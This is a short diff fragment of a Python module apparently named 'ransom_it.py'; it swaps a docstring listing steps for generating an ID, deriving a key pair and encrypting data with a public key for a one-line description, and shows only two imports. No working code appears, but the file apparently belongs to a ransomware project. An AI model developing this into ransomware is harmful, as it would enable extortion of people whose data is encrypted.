@@ -1,13 +1,4 @@
-"""
-
-Steps :
-# Generate random ID
-# Generate key pair from random ID
-# Encrypt data with public key
-
-"""
-
-
+"""Module for ransom_it.py"""
 
 import uuid
 import binascii
